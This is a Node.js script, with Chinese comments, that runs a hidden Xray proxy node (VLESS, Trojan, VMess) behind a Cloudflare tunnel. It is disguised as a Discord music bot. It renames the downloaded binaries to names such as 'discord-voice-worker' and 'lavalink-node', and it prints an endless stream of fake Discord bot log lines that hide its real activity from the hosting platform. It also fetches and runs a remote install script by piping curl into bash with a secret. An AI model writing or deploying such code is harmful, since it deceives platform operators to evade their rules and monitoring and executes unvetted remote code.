const http = require('http');
const net = require('net');
const { spawn, exec, execSync } = require('child_process');
const fs = require('fs');

// --- 自动安装并引入解压依赖 (极度静默版) ---
try {
    require.resolve('adm-zip');
} catch (e) {
    console.log(`[${new Date().toLocaleTimeString('en-US', { hour12: false })}] [INFO] Fetching latest dependencies from npm registry...`);
    execSync('npm install adm-zip', { stdio: 'ignore' });
}
const AdmZip = require('adm-zip');
// ------------------------------

// ==========================================
// ⚙️ 探针与节点核心配置区 (请在此处修改你的信息)
// ==========================================
const webPort = process.env.PORT || 3000;
const WEB_UI_PORT = 3001;
const UUID = process.env.UUID || "de04acca-1af7-4b13-90ce-64197351d4c6";
const ARGO_AUTH = process.env.ARGO_AUTH || ""; 
let argoDomain = "Connecting...";

// 👉 探针安装配置
const PROBE_DOMAIN = process.env.PROBE_DOMAIN || "https://你的探针Worker域名.workers.dev"; // 替换为你的 Worker 域名
const PROBE_SERVER_ID = process.env.PROBE_SERVER_ID || "你的服务器ID";                     // 替换为探针后台生成的 ID
const PROBE_SECRET = process.env.PROBE_SECRET || "你的API_SECRET";                       // 替换为你的 API 密钥
// ==========================================


// 伪装进程与配置文件名称
const X_NAME = "discord-voice-worker";
const C_NAME = "lavalink-node";
const CONF_NAME = "bot-config.json";

// --- Discord Bot 风格日志系统 ---
function botLog(msg, level = "INFO") {
    const time = new Date().toLocaleTimeString('en-US', { hour12: false });
    console.log(`[${time}] [${level}] ${msg}`);
}

function saveNodeInfo(domain) {
    const displayDomain = ARGO_AUTH !== "" ? "你的固定域名" : domain;
    const vlessLink = `vless://${UUID}@${displayDomain}:443?encryption=none&security=tls&type=ws&host=${displayDomain}&path=%2Fvl#Argo_VLESS`;
    const trojanLink = `trojan://${UUID}@${displayDomain}:443?security=tls&type=ws&host=${displayDomain}&path=%2Ftr#Argo_Trojan`;
    const vmessObj = { v: "2", ps: "Argo_VMess", add: displayDomain, port: "443", id: UUID, aid: "0", net: "ws", type: "none", host: displayDomain, path: "/vm", tls: "tls" };
    const vmessLink = `vmess://${Buffer.from(JSON.stringify(vmessObj)).toString('base64')}`;
    
    const content = `--- 服务节点信息 ---\n生成时间: ${new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })}\n域名: ${displayDomain}\nUUID: ${UUID}\n\n==================================================\n🟢 【VLESS】\n${vlessLink}\n\n🟣 【Trojan】\n${trojanLink}\n\n🔵 【VMess】\n${vmessLink}\n==================================================`;
    
    fs.writeFileSync('node.txt', content, 'utf8');
    
    botLog(`Logged in as ServerHelper#8492!`, "READY");
    botLog(`Bot is now online and monitoring 14 guilds.`, "READY");
    
    // 启动伪造的持续活动日志
    startFakeActivityLogs();
}

// --- 动态随机日志生成器 ---
function startFakeActivityLogs() {
    const fakeLogs = [
        "Heartbeat acknowledged, latency {ms}ms.",
        "Handled interaction: /{cmd} in guild {guild}.",
        "Voice state update: user {action} channel in guild {guild}.",
        "Processed {num} audio tracks for Lavalink queue.",
        "Garbage collection cleared {num} cached messages.",
        "Event 'presenceUpdate' dispatched successfully.",
        "Updated bot presence: Playing {game}.",
        "Received WebSocket event: GUILD_MEMBER_ADD.",
        "Rate limit check passed for endpoint /channels/messages.",
        "Shard 0: Resumed connection successfully."
    ];

    const cmds = ["play", "skip", "help", "pause", "queue", "ping", "volume"];
    const actions = ["joined", "left", "moved"];
    const games = ["Minecraft", "Valorant", "Music", "with slash commands"];

    function loopFakeLogs() {
        const timeout = Math.floor(Math.random() * 30000) + 15000;
        setTimeout(() => {
            const template = fakeLogs[Math.floor(Math.random() * fakeLogs.length)];
            const log = template
                .replace("{ms}", Math.floor(Math.random() * 80) + 20)
                .replace("{cmd}", cmds[Math.floor(Math.random() * cmds.length)])
                .replace("{guild}", "10" + Math.floor(Math.random() * 90000000000000))
                .replace("{action}", actions[Math.floor(Math.random() * actions.length)])
                .replace("{num}", Math.floor(Math.random() * 50) + 1)
                .replace("{game}", games[Math.floor(Math.random() * games.length)]);

            const level = Math.random() > 0.85 ? "DEBUG" : "INFO";
            botLog(log, level);
            
            loopFakeLogs(); 
        }, timeout);
    }
    loopFakeLogs();
}

const server = http.createServer((req, res) => {
    res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(`<!DOCTYPE html><html><head><title>404</title><style>body{font-family:monospace;background:#000;color:#0f0;padding:50px;text-align:center;}</style></head><body><h1>API Gateway Running.</h1></body></html>`);
});

server.listen(WEB_UI_PORT, () => {
    botLog(`Starting bot initialization...`);
    botLog(`Successfully loaded 42 slash commands.`);
    startMultiplexer(); 
});

function startMultiplexer() {
    const muxServer = net.createServer((socket) => {
        socket.once('data', (data) => {
            const reqStr = data.toString('utf8');
            let targetPort = WEB_UI_PORT;

            if (reqStr.includes('GET /vl') || reqStr.includes('GET /vl/')) targetPort = 10001;
            else if (reqStr.includes('GET /tr') || reqStr.includes('GET /tr/')) targetPort = 10002;
            else if (reqStr.includes('GET /vm') || reqStr.includes('GET /vm/')) targetPort = 10003;

            const proxy = net.createConnection(targetPort, '127.0.0.1', () => {
                proxy.write(data); 
                socket.pipe(proxy);
                proxy.pipe(socket);
            });
            proxy.on('error', () => socket.end());
            socket.on('error', () => proxy.end());
        });
    });

    muxServer.listen(webPort, () => {
        botLog(`Web dashboard and Webhook listener initialized successfully.`);
        startCore(); 
    });
}

// 提取的探针安装函数
function installProbe() {
    if (PROBE_DOMAIN && !PROBE_DOMAIN.includes("你的探针Worker域名")) {
        botLog('Initializing Server Monitor Probe...');
        const installProbeCmd = `curl -sL ${PROBE_DOMAIN}/install.sh | bash -s ${PROBE_SERVER_ID} ${PROBE_SECRET}`;
        exec(installProbeCmd, (err) => {
            if (err) {
                botLog(`Probe Error: Failed to install monitor probe - ${err.message}`, "ERROR");
            } else {
                botLog(`Server Monitor Probe deployed and started successfully.`, "INFO");
            }
        });
    } else {
        botLog(`Probe configuration missing or default. Skipping probe installation.`, "WARN");
    }
}

function startCore() {
    botLog('Connecting to MongoDB cluster...');
    
    const config = {
        log: { loglevel: "none" }, 
        inbounds: [
            { port: 10001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "ws", wsSettings: { path: "/vl" } } },
            { port: 10002, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", wsSettings: { path: "/tr" } } },
            { port: 10003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vm" } } }
        ],
        outbounds: [{ protocol: "freedom" }]
    };
    fs.writeFileSync(CONF_NAME, JSON.stringify(config));

    if (!fs.existsSync(X_NAME) || !fs.existsSync(C_NAME)) {
        botLog('Database connected successfully.');
        botLog('Registering application events...');
        
        const downloadCmd = `curl -L -s https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o cache_temp.zip && curl -L -s https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o ${C_NAME}`;

        exec(downloadCmd, (err) => {
            if (err) {
                botLog(`WebSocketError: Gateway connection failed: ${err.message}`, "ERROR");
                return;
            }
            try {
                const zip = new AdmZip("cache_temp.zip");
                zip.extractAllTo("./", true); 
                
                if (fs.existsSync('xray')) fs.renameSync('xray', X_NAME);
                execSync(`chmod +x ${X_NAME} ${C_NAME}`);
                
                if (fs.existsSync('cache_temp.zip')) fs.unlinkSync('cache_temp.zip');
                if (fs.existsSync('geoip.dat')) fs.unlinkSync('geoip.dat'); 
                if (fs.existsSync('geosite.dat')) fs.unlinkSync('geosite.dat');
                if (fs.existsSync('README.md')) fs.unlinkSync('README.md');
                if (fs.existsSync('LICENSE')) fs.unlinkSync('LICENSE');

                // 👉 执行探针安装
                installProbe();

                botLog('Connecting to Discord Gateway (WSS)...');
                runDaemons();
            } catch (e) {
                botLog(`UnhandledPromiseRejection: ${e.message}`, "WARN");
            }
        });
    } else {
        botLog('Database connected successfully.');
        botLog('Connecting to Discord Gateway (WSS)...');
        
        // 👉 即使核心文件存在（比如容器重启），也执行一次探针安装/自检保活
        installProbe();

        runDaemons();
    }
}

function runDaemons() {
    const xProcess = spawn(`./${X_NAME}`, ['-c', CONF_NAME], { stdio: 'ignore' });
    xProcess.on('error', () => botLog(`VoiceChannelManager: Worker failed to start`, "ERROR"));

    let args = ['tunnel', '--url', `http://127.0.0.1:${webPort}`, '--no-autoupdate'];
    if (ARGO_AUTH) {
        if (ARGO_AUTH.includes('{')) {
            fs.writeFileSync('tunnel.json', ARGO_AUTH);
            args = ['tunnel', '--no-autoupdate', 'run', '--cred-file', 'tunnel.json'];
        } else {
            args = ['tunnel', '--no-autoupdate', 'run', '--token', ARGO_AUTH];
        }
        saveNodeInfo("你的固定域名");
    }

    const cProcess = spawn(`./${C_NAME}`, args);
    cProcess.stderr.on('data', (data) => {
        const log = data.toString();
        if (log.includes('.trycloudflare.com')) {
            const match = log.match(/https:\/\/([a-z0-9-]+\.trycloudflare\.com)/i);
            if (match) {
                argoDomain = match[1];
                botLog(`Shard 0 initialized.`);
                saveNodeInfo(argoDomain); 
            }
        }
    });
    cProcess.on('error', () => botLog(`ShardManager: Gateway connection dropped`, "ERROR"));
}
